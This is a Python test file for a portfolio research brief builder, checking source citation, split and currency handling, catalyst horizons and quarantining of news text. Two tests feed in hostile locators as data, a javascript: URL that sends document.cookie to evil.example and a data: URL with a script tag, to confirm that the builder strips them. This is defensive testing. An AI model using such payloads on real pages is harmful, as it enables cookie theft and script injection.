"""Automatic briefs state only cited, structured facts; external text stays quarantined."""

import re
import unittest
from datetime import date

from portfolio_research.briefs import build_brief

PRICE_SOURCE = "yahoo_prices:" + "c" * 64
PREVIOUS_PRICE_SOURCE = "yahoo_prices:" + "d" * 64
ESTIMATE_SOURCE = "yahoo_estimates:" + "a" * 64
STATEMENT_SOURCE = "yahoo_statements:" + "b" * 64
NEWS_SOURCE = "yahoo_news:" + "e" * 64
NEWS_TITLE = "Analyst calls Example Manufacturing a generational buy"
GENERATED_AT = "2025-09-14T18:00:00+00:00"
BULLET_SECTIONS = (
    "changes_since_previous_review",
    "key_financial_developments",
    "market_expectations",
    "thesis",
    "counter_thesis",
    "invalidation_conditions",
)


def security():
    return {
        "security_id": "SEC-1",
        "name": "Example Manufacturing",
        "instrument_type": "equity",
        "equity_type": "ordinary_common",
        "sector": "Industrials",
        "currency": "USD",
    }


def price_rows():
    return [
        {
            "security_id": "SEC-1",
            "date": "2025-09-11",
            "close": 97.5,
            "adjusted_close": 97.5,
            "volume": 1_200_000,
            "currency": "USD",
            "available_at": "2025-09-11T20:00:00+00:00",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": PRICE_SOURCE,
        },
        {
            "security_id": "SEC-1",
            "date": "2025-09-12",
            "close": 100.0,
            "adjusted_close": 100.0,
            "volume": 1_500_000,
            "currency": "USD",
            "available_at": "2025-09-12T20:00:00+00:00",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": PRICE_SOURCE,
        },
    ]


def estimates_payload():
    return {
        "security_id": "SEC-1",
        "currency": "USD",
        "eps": {
            "0y": {
                "avg": 4.5,
                "low": 4.2,
                "high": 4.8,
                "year_ago": 4.1,
                "analysts": 11,
                "growth": 0.10,
            },
            "+1y": {
                "avg": 5.0,
                "low": 4.0,
                "high": 6.5,
                "year_ago": 4.5,
                "analysts": 12,
                "growth": 0.11,
            },
        },
        "revenue": {
            "+1y": {
                "avg": 1_123_200_000.0,
                "low": 1_080_000_000.0,
                "high": 1_160_000_000.0,
                "analysts": 10,
                "growth": 0.08,
            }
        },
        "price_targets": {
            "current": 100.0,
            "low": 80.0,
            "high": 140.0,
            "mean": 115.0,
            "median": 112.0,
        },
        "recommendations": {
            "period": "0m",
            "strong_buy": 5,
            "buy": 7,
            "hold": 3,
            "sell": 1,
            "strong_sell": 0,
        },
        "earnings_dates": ["2025-11-04", "2027-01-05"],
        "ex_dividend_date": "2025-10-10",
        "received_at": "2025-09-14T12:00:00+00:00",
        "source_id": ESTIMATE_SOURCE,
        "label": "External consensus estimate; not an established outcome",
    }


def ttm_payload():
    return {
        "security_id": "SEC-1",
        "period_end": "2025-06-30",
        "currency": "USD",
        "revenue": 1_000_000_000.0,
        "operating_income": 200_000_000.0,
        "net_income": 150_000_000.0,
        "income_common": 150_000_000.0,
        "operating_cash_flow": 220_000_000.0,
        "capex": 60_000_000.0,
        "assets": 1_500_000_000.0,
        "debt": 400_000_000.0,
        "cash": 300_000_000.0,
        "available_at": "2025-08-02T00:00:00+00:00",
        "received_at": "2025-08-02T00:00:00+00:00",
        "source_id": STATEMENT_SOURCE,
        "prior": {
            "period_end": "2024-06-30",
            "revenue": 900_000_000.0,
            "operating_income": 170_000_000.0,
            "net_income": 125_000_000.0,
        },
    }


def event_rows():
    return [
        {
            "security_id": "SEC-1",
            "event_date": "2025-09-05",
            "kind": "news",
            "title": NEWS_TITLE,
            "url": "https://example.com/news/1",
            "provider": "Example Newswire",
            "summary": "An opinion piece about the company.",
            "classification": "third_party_opinion",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": NEWS_SOURCE,
        },
        {
            "security_id": "SEC-1",
            "event_date": "2025-08-20",
            "kind": "filing",
            "title": "10-Q",
            "url": "https://www.sec.gov/Archives/edgar/data/1/10q.htm",
            "provider": "SEC",
            "classification": "issuer_fact",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": NEWS_SOURCE,
        },
        {
            "security_id": "SEC-1",
            "event_date": "2025-06-12",
            "kind": "filing",
            "title": "10-Q",
            "url": "https://www.sec.gov/Archives/edgar/data/1/10q-prior.htm",
            "provider": "SEC",
            "classification": "issuer_fact",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": NEWS_SOURCE,
        },
        {
            "security_id": "SEC-1",
            "event_date": "2025-08-28",
            "kind": "dividend",
            "title": "Dividend",
            "value": 0.32,
            "currency": "USD",
            "classification": "issuer_fact",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": PRICE_SOURCE,
        },
        {
            "security_id": "SEC-1",
            "event_date": "2025-11-04",
            "kind": "earnings_date",
            "title": "Scheduled earnings date",
            "classification": "issuer_fact",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": ESTIMATE_SOURCE,
        },
    ]


def previous_stub():
    return {
        "as_of": "2025-08-17",
        "close": 92.0,
        "currency": "USD",
        "source_id": PREVIOUS_PRICE_SOURCE,
        "received_at": "2025-08-17T20:00:00+00:00",
        "estimates": {"eps": {"+1y": {"avg": 4.6}}, "source_id": ESTIMATE_SOURCE},
    }


def brief(**overrides):
    kwargs = {
        "prices": price_rows(),
        "estimates": estimates_payload(),
        "ttm": ttm_payload(),
        "events": event_rows(),
        "previous": previous_stub(),
        "fx_note": None,
        "generated_at": GENERATED_AT,
        "horizon_months": 12,
    }
    kwargs.update(overrides)
    subject = kwargs.pop("security", security())
    return build_brief(subject, **kwargs)


def bullets(report):
    for section in BULLET_SECTIONS:
        for item in report[section]:
            yield section, item["text"], item["source_ids"]
    for item in report["catalysts"]:
        yield "catalysts", item["description"], item["source_ids"]


class BriefTest(unittest.TestCase):
    def test_every_bullet_cites_a_retained_source(self):
        report = brief()
        retained = {source["id"] for source in report["sources"]}
        self.assertTrue(retained)
        seen = set()
        for section, text, source_ids in bullets(report):
            self.assertTrue(text.strip(), section)
            self.assertTrue(source_ids, f"{section}: {text}")
            for source_id in source_ids:
                self.assertIn(source_id, retained, f"{section}: {text}")
            seen.add(section)
        self.assertEqual(seen, set(BULLET_SECTIONS) | {"catalysts"})

    def test_sources_carry_locator_receipt_and_adapter_version(self):
        report = brief()
        for source in report["sources"]:
            self.assertTrue(source["locator"])
            self.assertTrue(source["received_at"])
            self.assertTrue(source["version"])
            self.assertRegex(source["content_hash"], r"^[0-9a-f]{64}$")
        self.assertEqual(report["method_version"], "brief-template-1")
        self.assertEqual(report["basis"], "proposed_from_structured_facts")
        self.assertEqual(report["security_id"], "SEC-1")
        self.assertEqual(report["generated_at"], GENERATED_AT)

    def test_no_external_text_reaches_thesis_or_counter_thesis(self):
        report = brief()
        for section in ("thesis", "counter_thesis", "invalidation_conditions"):
            joined = " ".join(item["text"] for item in report[section])
            self.assertNotIn(NEWS_TITLE, joined)
            self.assertNotIn("Example Newswire", joined)
            self.assertNotIn("opinion piece", joined)
        news_bullets = [
            item
            for item in report["changes_since_previous_review"]
            if item.get("classification") == "third_party_opinion"
        ]
        self.assertTrue(news_bullets)
        self.assertIn(NEWS_TITLE, news_bullets[0]["text"])

    def test_changes_since_previous_review_quantify_price_and_estimates(self):
        changes = brief()["changes_since_previous_review"]
        texts = [item["text"] for item in changes]
        self.assertEqual(changes[0]["source_ids"], [PRICE_SOURCE, PREVIOUS_PRICE_SOURCE])
        joined = " ".join(texts)
        self.assertIn("2025-08-17", joined)
        self.assertRegex(joined, r"\+8\.7% ")
        self.assertRegex(joined, r"100\.00 USD")
        self.assertIn("92.00 USD", joined)
        self.assertRegex(joined, r"5\.00 USD versus 4\.60 USD")
        self.assertRegex(joined, r"1 new filing")
        self.assertIn("0.32 USD per share", joined)

    def test_a_split_between_reviews_is_not_reported_as_a_price_collapse(self):
        """The previous close is restated in current share terms before comparison."""
        split = {
            "security_id": "SEC-1",
            "event_date": "2025-09-02",
            "kind": "split",
            "title": "Split 2",
            "value": 2.0,
            "currency": None,
            "classification": "issuer_fact",
            "received_at": "2025-09-14T12:00:00+00:00",
            "source_id": PRICE_SOURCE,
        }
        previous = dict(previous_stub(), close=184.0)
        changes = brief(events=[*event_rows(), split], previous=previous)[
            "changes_since_previous_review"
        ]
        price = changes[0]["text"]
        self.assertIn("100.00 USD", price)
        self.assertRegex(price, r"\+8\.7%")
        self.assertIn("184.00 USD", price)
        self.assertIn("split", price.lower())

    def test_a_previous_close_in_another_currency_is_never_divided_into_a_change(self):
        previous = dict(previous_stub(), close=1.70, currency="GBP")
        changes = brief(previous=previous)["changes_since_previous_review"]
        price = changes[0]["text"]
        self.assertIn("100.00 USD", price)
        self.assertIn("GBP", price)
        self.assertNotRegex(price, r"[-+]\d+\.\d%")

    def test_a_non_https_provider_locator_never_becomes_a_source_locator(self):
        hostile = dict(
            event_rows()[0],
            url="javascript:fetch('https://evil.example/'+document.cookie)",
            source_id=NEWS_SOURCE,
        )
        report = brief(events=[hostile, *event_rows()[1:]])
        locators = [source["locator"] for source in report["sources"]]
        self.assertNotIn("javascript:", " ".join(locators))
        news = [source for source in report["sources"] if source["id"] == NEWS_SOURCE][0]
        self.assertEqual(news["locator"], "yahoo_news")

    def test_a_hostile_locator_never_reaches_the_published_result(self):
        from portfolio_research.public import public_result

        hostile = dict(event_rows()[0], url="data:text/html,<script>alert(1)</script>")
        report = brief(events=[hostile, *event_rows()[1:]])
        published = public_result({"research": {"SEC-1": {"brief": report}}, "sources": []})
        locators = [
            source["locator"] for source in published["research"]["SEC-1"]["brief"]["sources"]
        ]
        self.assertNotIn("data:", " ".join(locators))
        self.assertNotIn("script", " ".join(locators))

    def test_price_change_carries_the_supplied_fx_note(self):
        note = "Converted at USD/CAD 1.3554 on 2025-09-12 (Bank of Canada)."
        texts = " ".join(
            item["text"] for item in brief(fx_note=note)["changes_since_previous_review"]
        )
        self.assertIn(note, texts)

    def test_key_financial_developments_report_trailing_results(self):
        joined = " ".join(item["text"] for item in brief()["key_financial_developments"])
        self.assertIn("1,000,000,000 USD", joined)
        self.assertRegex(joined, r"\+11\.1%")
        self.assertIn("160,000,000 USD", joined)
        self.assertRegex(joined, r"26\.7% of assets")

    def test_market_expectations_are_labelled_external_estimates(self):
        items = brief()["market_expectations"]
        joined = " ".join(item["text"] for item in items)
        self.assertIn("external", joined.lower())
        self.assertIn("12 analysts", joined)
        self.assertIn("115.00 USD", joined)
        self.assertIn("12 of 16 ratings", joined)

    def test_catalysts_stay_inside_the_horizon(self):
        report = brief()
        as_of = date.fromisoformat(report["as_of"])
        targets = [date.fromisoformat(item["target_date"]) for item in report["catalysts"]]
        self.assertTrue(targets)
        for target in targets:
            self.assertLessEqual(as_of, target)
            self.assertLessEqual(target, date(2026, 9, 12))
        self.assertNotIn(date(2027, 1, 5), targets)
        self.assertIn(date(2025, 11, 4), targets)
        self.assertIn(date(2025, 10, 10), targets)

    def test_facts_are_draft_extractions_with_sources(self):
        report = brief()
        retained = {source["id"] for source in report["sources"]}
        self.assertTrue(report["facts"])
        ids = [fact["id"] for fact in report["facts"]]
        self.assertEqual(len(ids), len(set(ids)))
        for fact in report["facts"]:
            self.assertEqual(fact["origin"], "extracted")
            self.assertEqual(fact["review_status"], "draft")
            self.assertIn(fact["source_id"], retained)
            self.assertTrue(fact["field"])
            self.assertTrue(fact["units"])
            self.assertIsNotNone(fact["value"])
            self.assertTrue(re.fullmatch(r"\d{4}-\d{2}-\d{2}|.+T.+", str(fact["as_of"])))

    def test_missing_consensus_is_confined_to_its_own_sections(self):
        report = brief(estimates=None)
        retained = {source["id"] for source in report["sources"]}
        self.assertEqual(report["market_expectations"], [])
        self.assertTrue(report["key_financial_developments"])
        for _section, _text, source_ids in bullets(report):
            self.assertTrue(source_ids)
            self.assertTrue(set(source_ids) <= retained)
        self.assertTrue(
            any("consensus" in text.lower() for text in report["limitations"]),
            report["limitations"],
        )

    def test_missing_previous_review_is_recorded_as_a_limitation(self):
        report = brief(previous=None)
        joined = " ".join(text for _s, text, _ids in bullets(report))
        self.assertNotIn("previous review on", joined)
        self.assertTrue(
            any("previous review" in text.lower() for text in report["limitations"]),
            report["limitations"],
        )

    def test_brief_is_deterministic(self):
        self.assertEqual(brief(), brief())


if __name__ == "__main__":
    unittest.main()
